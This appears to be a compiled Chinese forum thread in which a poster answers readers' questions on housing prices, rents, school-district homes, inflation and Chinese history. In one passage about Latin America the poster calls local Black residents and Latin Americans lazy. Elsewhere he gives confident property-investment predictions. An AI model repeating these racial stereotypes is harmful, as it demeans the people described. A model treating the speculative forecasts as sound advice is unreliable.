<p>《西厢记》里张生和崔莺莺在山西停留一整月，在那永济县普救寺里，莺莺住西厢，张生住东厢，该故事充分说明：在廉租房里也可能发生爱情。</p>
<p>到了明清两代，又多出个廉租房的来源，便是会馆。在这异乡人建立的聚会场所里，客房租金相当便宜。顺治十八年建于北京的漳州会馆，福建人来租住，只象征性地收取租金：每月三文钱！ </p>
<h2 id="历史上买房最好的朝代"><a href="#历史上买房最好的朝代" class="headerlink" title="历史上买房最好的朝代"></a>历史上买房最好的朝代</h2><p>历朝历代，哪朝买房最容易呢？</p>
<p>南北朝最不靠谱，贫富相差极为悬殊，普通居民收入只有几千，房价则是几百万。谢灵运那样的大财阀“左江右湖，南北二山”，房价都被他们给炒上去了。 </p>
<p>唐朝不用说啊，我们都知道“居长安，大不易”，而且士大夫时兴攀比，为了写诗题名好看，非得有个别墅不行。比如王维有辋川别业，岑参有南溪别业，杜牧有樊川别业，就是白居易本人，后来也在洛阳买了十七亩地，修了个“履道园”。</p>
<p>宋朝文人叶梦得说：“人未有无产而致富者也。有好便田产，可买则买之……勿计厚值。”这话一再被地主老财们重复。有点闲钱，买房子置地，不惜一切代价。</p>
<p>明代买房也不是件容易事。《金瓶梅》第五十六回，西门庆的结义兄弟要买房，朋友帮他算了算帐，“一间门面，一间客座，一间床房，一间厨灶——四间房子是少不得的。论着价银，也得三四千多银子”。小户型房子，要三四千两银子。而清河县县令，从七品国家公务员，每年薪水不过三百五十两。就是说，就算县长去买房，如果不贪污的话，需要十年不吃不喝才能攒够房钱。明代楼市虚火上延，与攀比之风分不开。尽管明太祖规定，任何人不得超越等级建房，例如居民门窗不得使用朱红油漆；庶民住房不得超过三间；功臣宅邸两边可以保留五丈空地；军民房屋不许建成五间或九间；寺观庵院不得使用斗拱。但如小说里所说，庶民西门庆“现住着门面五间到底七进的房子”，超标超大发了。</p>
<p>嘉靖年间，大家纷纷打肿脸充胖子，浙江人的房子必须带客厅了，江西人的房子必须带兽头了，江苏人的房子里必须摆上时尚家具和精美古玩了。明朝中叶，北京的地皮已经涨到每亩纹银两千两，就是折成人民币也有好几十万。 　　　 </p>
<h2 id="未来房地产市场的发展"><a href="#未来房地产市场的发展" class="headerlink" title="未来房地产市场的发展"></a>未来房地产市场的发展</h2><blockquote>
<p><strong>中年不惑吗：</strong></p>
<p>楼主旅行结束呢？</p>
<p>将来房租市场会如何演化？</p>
<p>房租涨的太多，如果大多数租客的收入承担不起该如何？</p>
<p>例如租客的平均工资4000元&#x2F;月，你让他和别人合租一个小两室要6000元<br>他们承担不起恐怕就只能离开这个城市了</p>
<p><strong>kkndme:</strong></p>
<p>公租房具有平准作用，zf要敛财，不能定价太低，但也不会高的离谱。有了这个参照物，个人普通房出租应该保持在比公租房稍高水平，当然位置好的高端房精装房也可能租出天价。</p>
<p>中国的房价在未来将成为多数群众遥不可及的梦想，也可以说大多数人都不再关心商品房的房价涨跌。</p>
<p>未来，租房将成为常态，所以房子的位置环境装修的档次不同，房租的差距将会非常明显。但好房子一定只有中等收入以上家庭才租得起。</p>
<p>而买房子是富人阶层的事，中等收入家庭想都不敢想。</p>
</blockquote>
<blockquote>
<p><strong>中年不惑吗：</strong></p>
<p>呵呵，将来，只要中等收入的家庭2个月的收入能买1平米，他们也会买房子的</p>
<p>难道将来的房价要涨到中等收入家庭半年甚至更长的时间才能买1平米？</p>
<p><strong>kkndme:</strong></p>
<p>除了房价高，贷款也没那么容易。而且除了房子，各方面的花销都会涨得离谱，这是太平盛世后期的普遍规律。</p>
<p>关键还在于体制外的中产，都是逆水行舟，一旦不能前进，就可能沦为赤贫。</p>
</blockquote>
<blockquote>
<p><strong>九五二七八:</strong></p>
<p>楼主说的以后大部分人买不了房的论题<br>中美在这个方面的差距 怎么这么大呢<br>现在产业转移 一部分人就业就有回乡的趋势<br>今后再有一波转移 会不会再离故乡近一些<br>这样 分散置业 购买难度会不会下降</p>
<p><strong>kkndme:</strong></p>
<p>中美体制不同、文化不同、人口不同。一辆在美国2万美金的汽车，国内要卖几十万人民币。一件made in china的服装美国卖20美金，国内卖900人民币。</p>
<p>不管一线城市、三三线城市都是人满为患的，从一线城市逃离的也会驻扎在二三线城市，绝没有可能大中型城市向小城市回流。</p>
<p>返乡潮指的是家有自留地的农民工，如果工资待遇差不多，与其到沿海地区漂泊不如回乡打工或者种地。比如贵州镇远的油漆工一天工资是150，而在珠三角打工一天工资还不到150，这也是大量农民工返乡的原因。</p>
<p><strong>九五二七八:</strong></p>
<p>最难的怕是现在三四流的大学生和跟着打工父母生活在城里的二代<br>失去了农村生活本领<br>在城里也无法立足<br>楼主<br>难道拉美化真的不远了</p>
<p><strong>kkndme:</strong></p>
<p>很多人都丑化拉美，但是拉美的生活水平要高过我国。不说远超中国的巴西，即使是法属及荷属圭亚那(苏里南）这样的小国，人民的生活也很富足。</p>
<p>前几年有个援助项目去苏里南等拉美国家，去之前所有的人给我灌输的都是拉美国家如何贫困。但事实上，这些国家与中国完全不同，国穷民富，藏富于民，与中国正好是相反的，只要勤快点的家庭都还比较富裕。当然不排除也有很多穷人（美国也有很多穷人），穷人一般以当地的黑人为主，好吃懒做，整日无所事事。</p>
<p>这些国家的人民不如中国人勤奋，从不攒钱，只图眼前享受，我想主要原因还是由于币值不稳定，通货膨胀比较严重，所以没有人愿意攒钱。在拉美国家是无法炒房地产的，比如苏里南平均25平方公里有一口人，真的是地广人稀。所以才保留了世界上最高的森林覆盖率。</p>
<p>拉美人的懒惰会让中国人瞠目结舌，当地的蔬菜价格昂贵，尽管有大片肥沃的土地，当地却没有人愿意耕种，很多去苏里南种植蔬菜的中国人为此发了大财。</p>
<p>而相反中国人可以说是全世界最勤劳的民族，但是大量勤劳的中国人却过着低水准的生活。这与中国的国富民穷，藏富于国，与民争利的政策是分不开的。</p>
<p>拉美国家尽管有这样那样的问题，但是确实是法制国家与民主国家，私人财产神圣不可侵犯，这是与中国完全没有可比性的。</p>
</blockquote>
<blockquote>
<p><strong>九五二七八:</strong></p>
<p>一般对“拉美化”的定义是这个吧：贫富悬殊扩大、腐败严重、国有企业效率低下、社会治安恶化、城市人口过多、地下经济泛滥、对外资依赖性强、金融危机频繁和政局不稳定，等等</p>
<p>没去过拉美 不知道真实的拉美</p>
<p><strong>kkndme:</strong></p>
<p>看来拉美妖魔化后，深入人心了。好比在越南旅游，越南人自己说越南官僚太腐败，我笑了，能有中国腐败？</p>
<p>拉美的官僚机构，国企、医院、警察我都见识过。</p>
<p>说到官员的官僚，相比中国我真的觉得那里的官员很亲切。我曾经以一个游客的身份和苏里南的司法部长一起在街边小店喝咖啡。以一个陌生的外国游客身份在财政部长家里做客，逗他家的几个黑小孩玩。</p>
<p>说到治安，我在街边咖啡店坐了一下午，每二十分钟一辆巡逻车从我身边经过。里约热内卢的治安绝对不会差过广州。</p>
<p>国有企业效率低下恐怕是全世界的通病，况且拉美根本没有可能赚钱的行业全部由国企垄断。</p>
<p>政局不稳要看怎么理解，拉美国家是相对民主的国家，国家元首倒是常常因为民众的不满而换届（排除少数经常政变的军政国家）。但人民并没有感觉到不幸福。</p>
<p>拉美国家的经济基本被美国所控制，所以才会对外资依赖严重和金融危机频繁。作为一个主权国家我们看到的是国家财政贫困，但是作为拉美地区的中下层人民群众，生活水平和幸福感是要高于国内的中下层群众的。</p>
</blockquote>
<h2 id="房产到期"><a href="#房产到期" class="headerlink" title="房产到期"></a>房产到期</h2><blockquote>
<p><strong>不明真相的草民：</strong></p>
<p>向LZ请教</p>
<p>商品房的土地证年限有多重要？</p>
<p>现在一个二线城市的开发区，中心地段很多小区房子倒是新盖的，但地是90年代初拿的，有40年、50年的，还有30年20年的，大部分房子的土地证从现在算起只有10几年20几年，有的房子土地证已经到期了，但由于位置较好所以房价一点不便宜。按KFS的说法，土地证到期将来再续就是了，没有大的影响。</p>
<p>LZ给分析一下，这样房子将来的风险在哪？如果买来自住又如何？</p>
<p>谢谢！</p>
<p><strong>kkndme：</strong></p>
<p>其实有无土地证都无所谓，无论有没有土地证，最大的风险都在dfzf，人治社会法律文件其实就是一张纸，关键还是zf做得不要太过份。</p>
<p>即使你证件齐全zf想拆一定会拆，即使没有土地证拆的时候也会同样补偿。</p>
<p>这个东西实在没多大意义。</p>
<p><strong>不明真相的草民：</strong></p>
<p>感谢LZ答复。都是新建的高层，应该不会轻易拆迁，这么说自住还好。但如果将来要出手是否就存在困难？？</p>
<p>期望LZ继续指明。</p>
<p>Lz似乎没有看到这个问题，再次感谢Lz，望答复。</p>
<p><strong>kkndme：</strong></p>
<p>出手不存在困难。二手房交易国家不会对土地证进行严格限制，关键还是房产证。</p>
</blockquote>
<h2 id="买学区房问题"><a href="#买学区房问题" class="headerlink" title="买学区房问题"></a>买学区房问题</h2><blockquote>
<p><strong>开洋木瓜：</strong></p>
<p>楼主，有个问题想咨询一下。</p>
<p>家在南京，郊区有一套自住房，130平，市值大概150万左右。市中心有一套小公房，居住权，目前空置（刚分到的，还没有装修，而且单位也禁止对外出租）。现在宝宝一岁，想给宝宝买个学区房，很多名校都要求提前三年落户，所以必须要在2年内买房。一线的学区房单价在2万2-2万6之间。一线小学的分校学区房在1万5-2万之间。我想买的是一个名小的分校，近几年的小升初成绩都非常不错，可以进入南京前三名。</p>
<p>我想买的一个房子位于这个小学的学区，是拆迁安置房，97年的房子，小区环境比较杂乱，没有物管，停车也不方便。但是周围配套都非常齐全，菜场超市医院都很近，上学也不用过马路。今年年初，2月份的时候我本来在这个小区买了一套，但因为房价上涨房主违约。当时买的房价是12500，现在看中一套，房主要17000，挂了很久没卖掉，我出15000，可能有机会成交。</p>
<p>这个隔壁有个新小区，物管环境都很好，但价格也上到2万一平了，如果要在这个新小区买房，我们家里的钱就不够了，如果要卖掉现有的房子去买，老公也不愿意。</p>
<p>还有个问题是，房主要求净得价，12月的时候满五年，就不用付营业税。如果现在交易过户也可以，但要多付几万块。如果算上这几万的税，房价就差不多一万七一平了，我也不愿意现在过户多付这个钱。如果现在签约等12月再交易过户会不会有风险？另外现在是否是出手时机？请楼主赐教。</p>
<p><strong>kkndme：</strong></p>
<p>学区房即使在调控最严厉的时期也几乎不可能下跌。但是在上涨期就很难买到，因为房东会跳价。</p>
<p>12月过户有一定风险，如果到12月时，房价上涨比较厉害，房东有可能违约。</p>
<p>制约房东违约的方法就是签较高的违约金。</p>
</blockquote>
<h2 id="人口普查"><a href="#人口普查" class="headerlink" title="人口普查"></a>人口普查</h2><blockquote>
<p><strong>平静的房奴：</strong></p>
<p>看来楼主今天比较空闲，一口气发了这么多帖子。</p>
<p>有个问题想青椒哈楼主，我在武汉，最近武汉在全免清理个人和家庭住房信息，晚上调查人员还上门登记、记录，请问这是何意？是否在为出台房产税做准备。</p>
<p><strong>kkndme:</strong></p>
<p>人口普查。不但武汉，连穷山沟里也在忙这个，穷乡僻壤的支书天天忙得不亦乐乎。这是第六次人口普查，前面查过五次了</p>
</blockquote>
<h2 id="昆山"><a href="#昆山" class="headerlink" title="昆山"></a>昆山</h2><blockquote>
<p><strong>買房難：</strong></p>
<p>樓主﹐麻煩你分析一下昆山的房價吧﹐先謝謝﹗﹗</p>
<p>昆山是一個縣級市﹐原先是屬于蘇州的﹐離上海很近﹐動車只要20分鐘﹐現在高鐵也開通了﹐原先房價還算便宜的﹐現在連鎮上也貴到五千多六千了﹐市中心最便宜的也要七千多八千﹐09年10月的時候一下子漲了很多﹐原先我看好的一套二手房32萬﹐現在要50多萬﹐太奇怪了</p>
<p><strong>kkndme：</strong></p>
<p>昆山不能理解为县级市，要理解为上海的卫星城。相当于北京的燕郊。所以房子八千多一点也不奇怪。</p>
<p><strong>買房難：</strong></p>
<p>謝謝樓主回復﹗昆山市中心的房子大一點的開發商開發的如世茂在一萬左右一平﹐這個價位算不算高啊﹖</p>
<p>買房子要在市中心好點呢﹐還是城東靠近上海方向好些﹖</p>
<p>昆山很小的﹐就那么几個鎮﹐現在火車站﹐汽車站﹐高鐵﹐人才市場都在城南﹐另外除市中心的玉山鎮外﹐其它的都是工廠很多﹐污染還是多。</p>
<p><strong>kkndme：</strong></p>
<p>买在哪里合适，你要看zf规划，跟着zf规划走。比如房山，zf打造的是长阳而不是老的镇中心，所以买房就应当买在长阳。道理是一样的。</p>
</blockquote>
<h2 id="买房争取一步到位"><a href="#买房争取一步到位" class="headerlink" title="买房争取一步到位"></a>买房争取一步到位</h2><p><strong>hohowell:</strong></p>
<p>楼主，诚心请教下，从开贴开始就一直在潜水关注，终于坚定了买房的决心</p>
<p>现在在犹豫，一是买个80平米的小户型，开发商一般，房型尚可，这样贷款比较少，基本不影响供车，旅游和以后小孩的开销，不过考虑5到8年左右，这个房子就不能满足居住要求了，回头换，又是一大笔钱，而且城区内的好小区也会越来越小，另外一个就是保利的大户型，开发商物业都靠得住，基本上短期可以不用换，不过贷款至少贷100多万，短期内还会要小孩，压力会比较大，基本手里每个月都没有闲钱了，很容易回到赤贫线，一直犹豫不决，诚心请教楼主解惑，我在南京，一个一线以下二线以上的鬼地方，两处房子都靠地铁，周边商业中心配套齐全，谢谢！</p>
<p><strong>kkndme：</strong></p>
<p>买房子如果有能力还是要争取一步到位。将来改善，除非个人有较大的发展，否则将很难很难。而且买楼首选好位置，大开发商，大盘，升值空间才大。</p>
<blockquote>
<p><strong>welldayzwb：</strong></p>
<p>看来楼主分析说购房应该一步到位，我就犯了一个错误，用投资的眼光来选择自住房，后来买的两居室比同小区的三居室性价比高很多，但是居住环境不好，临一条小街，所以现在住起来不是很爽，现在调控着价格先不说了，光是现在限制换房的一些条条框框感觉再置换就很麻烦<br>另外一套买的外面一点，小区环境非常棒，不过当时是被环境给迷惑了，放租的房子管那么多环境做什么，感觉两套房子操作反了<br>纠结中啊纠结中，现在唯一能安慰自己的就是，买上房子总比没买强，如果去年年底再犹豫一下或是赌气的话，那就真是悲剧了，一个好三居得活活等成质量差些的两居了</p>
</blockquote>
<h2 id="收入稳定的家庭如何买房"><a href="#收入稳定的家庭如何买房" class="headerlink" title="收入稳定的家庭如何买房"></a>收入稳定的家庭如何买房</h2><p><strong>黑眼圈钱：</strong></p>
<p>请教楼主，买房子的事情，比较纠结。</p>
<p>1）夫妻两人均在西部某高校任职，一个教师，一个行政人员，年龄都不小了，37和35，两人每月总收入在8000-10000，1年算10万收入，应该会多一点。</p>
<ol start="2">
<li>一个女儿，才两个多月。</li>
<li>3）每年给双方父母1万，双方父母均已60出头，一方父母城里的有退休金及医保。另一方父母农村的，得为他们准备点钱。</li>
</ol>
<p>4）目前租住单位两室一厅房，就在学校住宅小区内，除了小点，别的都好，房租100。</p>
<p>5）公积金两人很少，约1000元每月，未来1-2年内会有购福利房机会，估计90多平方的旧三室一厅（约需 10万元），可能有120平米的房子，但需要排队看单位建房情况（2000每平米）。</p>
<p>6）两人都有单位医疗保险。</p>
<p>7）孩子可以上学校的幼儿园和小学、初中，就在150米范围内。</p>
<p>8）对于车没有什么想法，每天步行上班用不到车代步。不过会买辆10万左右的。</p>
<p>9）现在没有任何投资和理财。银行存款1-2年期定期存款50万，这个傻了，已经存2年了，平时光顾着干活。</p>
<p>有没有必要买个商品房呢，周围的房价从08年的4500涨到现在8500，容积率还非常高，并且楼间距等等不理想，那种房子我不想住的。</p>
<p>其实在附近买套120平米的房子，首付后也供得起，买房子放那等涨价或者出租？ 不想放弃单位的房子，每天睡到自然醒再去上班还是挺惬意的，送孩子上幼儿园上学也方便。</p>
<p>买了房子后经济会紧张些，不像现在自由。财务自由也算一种幸福吧，我太太对于房子没什么要求，所以也不给我什么压力。</p>
<p><strong>kkndme：</strong></p>
<p>对于工作稳定，收入不错的体制内家庭，基本上的情况就是有闲钱就买房。主要还是由于收入稳定不用担心失业，钱放着只有贬值，不如置业。投资型住房与自住型住房在选择方向上有很大不同。</p>
<p>举个例子，昆明打造了个螺丝湾，几乎半个昆明做生意的人都聚集在哪里。如果自住没有人愿意选择在那里买房，实在是不好住。但是投资确是最好的选择，因为可以获取较高的租金的收益，将来升值空间也不会小。</p>
<p>假如在昆明一环附近买一套两居室，月租金一般在1500-1800，而房价在万元左右。而在螺蛳湾附近买一套两居室，月租金都在2000多，而房价在7000多。</p>
<h2 id="为什么人口红利消失，未来的房子还看涨"><a href="#为什么人口红利消失，未来的房子还看涨" class="headerlink" title="为什么人口红利消失，未来的房子还看涨"></a>为什么人口红利消失，未来的房子还看涨</h2><blockquote>
<p><strong>和风中的树叶:</strong></p>
<p>看了那么多 有点意思<br>不过在下有一事想不明白：<br>因中国的计划生育政策 往近了说 人口红利会在这几年消失 往远了说 80后基本都是独生子女 父辈在城市里都是有房子的 这些房子作为遗产 按理说 在未来应该使00后没有买房的需求。<br>LZ如何解释在这种情况下在未来房子仍然看涨？</p>
<p><strong>kkndme:</strong></p>
<p>回去找了一下，居然被删了。<br>大意基本是讲中国经济未来的发展模式，城市升级与拆迁改造的关系，没想到这样也不允许说。实在懒得再长篇大论说一遍。<br>关键的意思就是一方面是富裕阶层对更高端产品，更大面积的追求，一方面是城市升级带来的大规模拆迁改造。下层群众将被挤出城市核心区。许多住房都会被拆迁置换。</p>
</blockquote>
<h2 id="意大利的住房模式"><a href="#意大利的住房模式" class="headerlink" title="意大利的住房模式"></a>意大利的住房模式</h2><p>我本人对意大利的住房模式还是比较赞同的。<br>有去过米兰的朋友可能很清楚，米兰城区的房屋居住的大多数是富豪显贵，一旦出了城区，则是大片大片鳞次栉比的公租房供普通工薪族居住。<br>以后的中国有可能学习这个模式，原市中心的居民被拆迁安置到郊区，城区居住的都是达官贵人。郊区将形成拆迁安置房、中产阶级商品房、公租房、廉租房混居的模式。</p>
<h2 id="中国的学术"><a href="#中国的学术" class="headerlink" title="中国的学术"></a>中国的学术</h2><p>97年我大学毕业的第一任老板就是在龙乡小区买的房，我还到他家送礼。那时从城里骑车到西三旗，花了我将近两个小时。一晃就十几年过去了，真是有很多感慨。</p>
<blockquote>
<p><strong>汝爱之罪：</strong></p>
<p>感觉您是学者型的啊，看您去做田野调查什么的。大学毕业送礼给老板。。。。</p>
<p>看您点评回龙观的那一段，估计很多人要捶胸顿足的后悔了。回龙观真是个奇迹，从2600涨到15000，让所有人大跌眼镜。</p>
<p><strong>kkndme：</strong></p>
<p>送礼也算学者型？晕</p>
<p><strong>九五二七八：</strong></p>
<p>他是说本以为你是学者型的 不需要送礼<br>现在看到你说送礼 觉得自己判断失误了 呵呵<br>现在这个时代 学者也需要送礼啊</p>
<p><strong>汝爱之罪：</strong></p>
<p>差不多这个意思，呵呵。我一直以为楼主是搞学术的。</p>
<p>其实吧，虽然大多数学者砖家都成了贬义词，但我觉得在北京这个大环境里，还是有土壤培养一些目光敏锐犀利的人，BBS的P民也需要这样有前瞻性的引导者，因为毕竟不是每个人都强大到能把这些东西娓娓道来，没有积淀，根本悟不出。</p>
<p><strong>kkndme:</strong></p>
<p>中国的学者是很难拿出点时间好好搞搞学问的，功利性太强。</p>
<p>以前跟一伙民族学者到元阳考察，这帮人没呆满两个星期就跑回去了，说是又要评职称了，人不能不在单位。而日本学者已经在元阳与当地人同吃同住了3年，还没有一次回日本。真不知道这帮民族学者研究了两个星期的东西能发表什么样的惊世论文出来。</p>
</blockquote>
<h2 id="精英的财产"><a href="#精英的财产" class="headerlink" title="精英的财产"></a>精英的财产</h2><p>5万一平的房子对于中国的精英阶层真算不上什么。500、600万一套的房子一次性付清的人群在北京大把的存在着。这是很多工薪阶层一辈子都觉得不可能挣到的财富，但对于另外一些人却可以轻而易举的拿出来。平均工资的概念在中国是完全没有用处的。</p>
<blockquote>
<p><strong>baiyang11112010：</strong></p>
<p>直白说，我刚毕业一年，完全靠着父母资助，要完全靠自己根本买不起房，我一些同学在北京两人的话年薪也就15万左右吧，现在好歹还能惦念着买房，要是像您所说，“北四环西四环东四环达到5万，北五环西五环外到达3万应该不是什么难事”，那他们根本就没有盼头了，这是很可怕的事啊</p>
<p><strong>kkndme：</strong></p>
<p>将来年薪20万的中产阶层一定连北京6环内的房子都买不起。这一天，不会很远。</p>
</blockquote>
<blockquote>
<p><strong>tianxiaobing11：</strong></p>
<p>楼主，我也是不明白，现在成交量确实上来了，按说现在贷款控制的这么严，第三套房都贷不到款，是谁在买房，难道都是第一套房的刚需吗</p>
<blockquote>
<p><strong>bluesyang2010：</strong></p>
<p>我认为,这个跟kfs和政府之间的博弈有很大关系,投资人前段时间一直在观望或者投入到农产品等领域,我不记得是7月还是8月,突然听到热钱大量涌入国内房地产市场的传闻,之后成交量就上来了,这些信息之间有很大的关系,但我捋不清.<br>请楼主评评</p>
<p><strong>kkndme:</strong></p>
<p>你说的很有道理，当资金泛滥无处可去，一定会找到一个出口。资金如洪水在于疏而不在于堵，资金一旦冲破调控所筑的堤坝，将一发不可收拾。所以屡次调控屡次暴涨。如果不能有效开渠，将注定调控政策的失败。</p>
</blockquote>
<p><strong>kkndme：</strong></p>
<p>民币发行泛滥，有钱人绝对数量庞大。在北京上海等城市，手中拥有千万现金的人不在少数，都是全国的精英阶层啊。精英阶层的财富积累已经逐步完成，提高首付，严控贷款只能抑制小白领保值的需求，但对于精英阶层是没有任何作用的。</p>
<p>如果将来推出房产税就更好笑了。精英阶层谈笑风声，小白领神情紧张，最终结果是全部转嫁租房客。</p>
</blockquote>
<blockquote>
<p><strong>tianxiaobing11：</strong></p>
<p>还有一个问题始终不明白，请教楼主，现在五六百万的房子都有人全款买，这些人为什么不买国外的别墅呢？难道就因为中国的房子升值快吗？要我有那么多钱早移民了</p>
<p><strong>kkndme：</strong></p>
<p>我国实行的是外汇管制，人民币不能自由兑换，不可能大批人口通过地下钱庄转移资产。只有官员和少部分有背景的高端人士才能做到人民币资产顺利兑换转移。</p>
<p>一旦发现较多资金量的人民币兑换美元出境，国家将采取强制管制措施。</p>
<p>现在国家对外汇外流已经非常重视，携带价值50美元以上的商品入境都要交税，实际上国家给出了一个不希望人民币兑换成外币外流的一个强烈信号。</p>
<p><strong>理财的猫咪：</strong></p>
<p>我有段动过移民的念头，但现在基本放弃了。不知自己的选择正确与否，想听听楼主高见。</p>
<p><strong>kkndme：</strong></p>
<p>移民不见得能够适应，毕竟文化差异太大，但是如果拥有一个外国国籍，在中国生活，是一个比较好的选择，至少，你的财产是受到保护的。</p>
</blockquote>
<blockquote>
<p><strong>showcar:</strong></p>
<p>楼主说的正确啊，除非世界经济再次崩溃或者朝内变天，否则的房价要跌，太难！</p>
<p>到处听说是纸币不受截至的发行，有点现金留在手上都发抖啊，是因为“贬值”发抖！</p>
<p>所以，出手了，淘一套保值去吧！！总价150万左右。</p>
<p>楼主请教付款方式：<br>1：分期付款，30%首付，6个月内付30%， 12个月内付30%，10%交房前付清（约24个月）；<br>2：商业银行贷款，需要50%首付，50%余款贷款，首付3个月后按揭，110%的贷款利息。<br>商业贷款的话，计划交房后就付清。</p>
<p>不知道哪个更合算？期待楼主解惑。。。。</p>
<p><strong>kkndme:</strong></p>
<p>分期付款是你和房东的约定？这个比较不靠谱，如果是付清后过户，一旦房价上涨，很可能出现毁约。</p>
</blockquote>
<blockquote>
<p><strong>tianxiaobing11:</strong></p>
<p>我现在就被抑制住了，现在是认房不认贷，我也不能贷款了，可现在动不动就得百万以上才能买房，真是力不从心啊，房贷新政看来是堵塞了中低收入的房产投资渠道了，对精英阶层反而是利好，这调控就搞笑了</p>
<p><strong>bluesyang2010:</strong></p>
<p>zf倒是想调控精英层呢,但zf本身就是精英的组成部分,所以zf只能借砍掉投机者之名,开拓自身,抢占市场,特别是楼主说的租赁这个大市场,所以特别佩服楼主之前说的:zf找到了吃租赁这块蛋糕的最好时机,明着是抑制房价,其果却是让很大部分老百姓租着zf的房,zf的钱就更多了,到时候想拆哪儿拆哪儿,精英更精英,百姓更百姓….可悲呀</p>
<p><strong>kkndme:</strong></p>
<p>估计给政府出这主意的幕僚熟读过宋史，宋代官府就是靠出租房给群众敛财的。</p>
</blockquote>
<h2 id="中国的新闻不可信"><a href="#中国的新闻不可信" class="headerlink" title="中国的新闻不可信"></a>中国的新闻不可信</h2><blockquote>
<p><strong>bluesyang2010：</strong></p>
<p>搂主分析一下,现在的新闻都说房屋成交量的上升是因为kfs打折才上升的,但这个很不成立,为什么新闻这么懵老百姓.是不是政策上还有可能收得更紧?</p>
<p><strong>kkndme：</strong></p>
<p>中国的新闻最不可信，为了抓眼球不惜胡编乱造，不惜前后自相矛盾。我倒觉得这个成交量放大的背后的意义更值得深入研究。</p>
<p>在二套房首付50%，三套房首付更是严格控制的前提下，成交量大幅提升，中国的货币到底泛滥到何种程度，中国的精英阶层的绝对数量多么庞大，手里多么有钱。中国的贫富差距很可能已经达到了一般人不敢想象的程度。</p>
<p>这是一个坏的预兆。</p>
</blockquote>
<h2 id="通货膨胀和房价的关系"><a href="#通货膨胀和房价的关系" class="headerlink" title="通货膨胀和房价的关系"></a>通货膨胀和房价的关系</h2><p>要解释通膨和房价的关系，我来建个简单的模型，跟大家说说</p>
<p>假设5年前，某个国家一共有10个一篮子生活必须品（包括吃，穿，住，行的所有的必需品），这个国家发行了100万货币，一共有10个人。那么这个国家的毎个篮子生活必须品价值10万。</p>
<p>假设这10个人每人得到了10万元收入，则每个人刚好分配了一个篮子。</p>
<p>实际情况是，这10个人中，有人得到了10万元，有人得到了8万元，有人得到12万元。那么这10个篮子通过在品质上的差别有所区分，卖给这10个人，刚好1人1份，只不过有的品质略好些，有的品质略差些。<br>时间过了5年，这个国家增加到20个一篮子生活必须品，人口还是10个人，但是发行了1000万的货币，那么这个国家的毎个篮子生活必须品价值50万。价格翻了5倍。如果每个人平均是100万，则每个人可以得到2篮子生活必需品，生活提高了。但实际上是，这10个人中，4个穷人每人还是10万，3个普通人每人是20万，剩下3个富人每人300万。</p>
<p>这3个富人共900万可以买掉18个一篮子生活必需品。剩下7个人只能分配到2个一篮子生活必需品。这样势必有人会饿死。而且无论是穷人还是普通人都买不起任何一个一篮子生活必需品。社会不可能只有富人才配生存，没有穷人，富人就不会存在。</p>
<p>因此必须有一项物品能够从一篮子生活必须品中剥离出来，吸收掉富人庞大的资金，同时也要让穷人和普通人能够买的起一篮子生活必需品中能够维持生命的最基本的生活品。</p>
<p>于是就要把一篮子生活必须品进行拆分。找到一项物品，不拥有不会饿死，但拥有能够让人过的舒服，具备高的使用价值，能够保存，具备稀缺性。</p>
<p>这个东西就是具备产权房屋（注意不是使用权），而一篮子生活必须品中其他的东西都不具备这个条件。<br>吃的不能保存，</p>
<p>衣服不具备稀缺性，</p>
<p>土地和房屋，是生产，居住，商业贸易的必需品，可以保存，具备稀缺性，富人拥有房屋土地的所有权可以租给普通人和穷人进行生产和居住。土地和房屋超过租金部分的溢价就变成了富人中吸收资金，炫耀财富的特殊品。</p>
<p>所以请注意，真正吸收大量发行的被富人拥有的货币的，是土地和房屋超过租金部分的溢价，所以房屋的租售比很低是货币大量发行造成的。房屋土地租金成为了新的一篮子货币中的必需品，而房屋土地所有权被剥离出来变成了富人之间货币再分配的游戏。<br>这样一篮子生活必须品进行了重新定义，本来包括的房屋，变成了房屋租金，而房屋所有权被从一篮子生活必须品中剥离出来，变成了吸收富人多出来的货币的奢嗜品。而一篮子生活品分成两大类，即最基本的和品质高的。</p>
<p>最基本的又变成了10万一个，保证这个国家的4个穷人可以每人得到一份。</p>
<p>品质高的，20万一个,3个普通人和3个富人每人得到一份就可以得到较好品质的生活。</p>
<p>多出来的840万，就是房屋的所有权，供3个富人拥有。房屋所有权的价格远高于租金，这是因为房屋所有权已经变成了富人炫耀的资本，身份的象征。<br>因此说，高房价的根本原因是由于货币发行泛滥和收入分配不公。这个根本问题不解决房价不可能下降。</p>
<p>而且单纯的依靠行政手段让房价下跌不但不能抑制通货膨胀，多出来的流动泛滥的货币得不到有效吸收，会推动生活必需品上涨，使穷人的生活更加艰难。<br>当然，有人的说，这多出来的840万为什么不投入到创新领域带动需求，增加一篮子生活必须品的品质。</p>
<p>这显然是不现实的，900万的财富集中在3个人手里，剩余7个人总共只分到100万，而平均一篮子生活必需品的价格是50万，7个人应该有350才能满足生活需要。购买力的不足一定会使远离生活必须品的任何东西都没有市场。</p>
<p>高房价，低租金是货币泛滥发行和分配不公的必然结果，而不是推动通货膨胀的，阻碍实体经济发展的原因。</p>
<p>货币泛滥和分配不公才是实体经济发展困难，房价高企的根本原因</p>
<blockquote>
<p>fataltomato</p>
<p>有钱人的投资渠道一般都不是房子</p>
<p>房子最多是资产配置中的一项</p>
<p>开始投房收租，说明财富控制能力的下滑，往往意味着人生下坡路的开始</p>
<p>所以诸君，还是努力赚钱改变人生为第一要务</p>
<p>评来论去，于事无补</p>
<p>别人说到了，你不一定明白，你明白了，不一定有体会</p>
<p>你有体会，不一定能做到，你做到了，不一定能做好</p>
<p>你做好了，还不一定有机会呢，呵呵</p>
<p>welldayzwb：</p>
<p>对于不善理财的人来说，买房收租未尝不是一个选择，到没必要上纲上线，当然为了收租而买房，目前看起来不是很理想的一个选择</p>
</blockquote>
<blockquote>
<p>baiyang11112010</p>
<p>我觉得LZ你的分析思路不错，但是这种涨幅应该不会再有了吧？虽然我今年4月投资了一套，但是，我能回本就行，没敢过分估计，你这样有煽动别人之心啊</p>
<p>kkndme：</p>
<p>首先投资房产不是炒股，不能有炒股的心态。目前说起投资房产是最安全的品种，指的是长线投资，而不是短线投机炒房。短线投机炒房还是因政策的不稳定有较高风险的，一旦资金链断掉，将万劫不复。</p>
<p>对于4月份，在山雨欲来风满楼的特殊时期，投资一线城市郊区房地产肯定是欠考虑的。</p>
